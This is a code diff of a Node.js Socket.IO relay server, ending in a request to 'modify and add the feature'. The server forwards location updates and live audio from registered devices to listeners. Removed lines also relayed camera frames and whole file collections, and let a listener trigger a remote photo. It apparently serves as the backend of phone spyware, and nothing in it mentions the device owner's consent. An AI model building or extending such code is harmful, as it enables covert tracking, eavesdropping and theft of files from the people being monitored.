@@ -15,20 +15,19 @@ const io = new Server(server, {
 app.use(express.static(path.join(__dirname, "public")));
 
 // Track devices and listeners
-const devices = new Map();    // Map socket.id -> device info
+const devices = new Set();
 const listeners = new Set();
 
-// Socket.IO connections
 io.on("connection", (socket) => {
   console.log(`🔌 Client connected: ${socket.id}`);
 
-  // Device registration
+  // When device registers
   socket.on("device-register", () => {
-    devices.set(socket.id, { id: socket.id, lastActive: Date.now() });
+    devices.add(socket.id);
     console.log(`📱 Device registered: ${socket.id}`);
   });
 
-  // Listener registration
+  // When listener registers
   socket.on("listener-register", () => {
     listeners.add(socket.id);
     console.log(`🖥️ Listener registered: ${socket.id}`);
@@ -36,36 +35,18 @@ io.on("connection", (socket) => {
 
   // Forward location updates
   socket.on("location-update", (data) => {
-    // Update lastActive timestamp
-    if (devices.has(socket.id)) devices.get(socket.id).lastActive = Date.now();
-    listeners.forEach((id) => io.to(id).emit("location-update", { deviceId: socket.id, ...data }));
+    console.log(`📍 Location from ${socket.id}:`, data);
+    listeners.forEach((id) => {
+      io.to(id).emit("location-update", data);
+    });
   });
 
   // Forward audio chunks
   socket.on("audio-chunk", (chunk) => {
-    if (devices.has(socket.id)) devices.get(socket.id).lastActive = Date.now();
-    listeners.forEach((id) => io.to(id).emit("audio-chunk", { deviceId: socket.id, chunk }));
-  });
-
-  // Forward camera frames
-  socket.on("camera-frame", (base64Image) => {
-    if (devices.has(socket.id)) devices.get(socket.id).lastActive = Date.now();
-    listeners.forEach((id) => io.to(id).emit("camera-frame", { deviceId: socket.id, frame: base64Image }));
-  });
-
-  // Forward all files from device
-  socket.on("all-files", (filesArray) => {
-    if (devices.has(socket.id)) devices.get(socket.id).lastActive = Date.now();
-    listeners.forEach((id) => io.to(id).emit("all-files", { deviceId: socket.id, files: filesArray }));
-    console.log(`📁 Received ${filesArray.length} files from ${socket.id}`);
-  });
-
-  // Listener request: trigger camera capture on device
-  socket.on("request-camera", (deviceId) => {
-    if (devices.has(deviceId)) {
-      io.to(deviceId).emit("take-photo");
-      console.log(`📸 Requested camera capture from ${deviceId}`);
-    }
+    console.log(`🎤 Audio chunk from ${socket.id}, size: ${chunk.length}`);
+    listeners.forEach((id) => {
+      io.to(id).emit("audio-chunk", chunk);
+    });
   });
 
   // Handle disconnect
@@ -76,12 +57,8 @@ io.on("connection", (socket) => {
   });
 });
 
-// Endpoint to list active devices (optional)
-app.get("/devices", (req, res) => {
-  const activeDevices = Array.from(devices.values());
-  res.json(activeDevices);
-});
-
 server.listen(PORT, () => {
   console.log(`🚀 Server listening on port ${PORT}`);
 });
+
+modify and add the feature
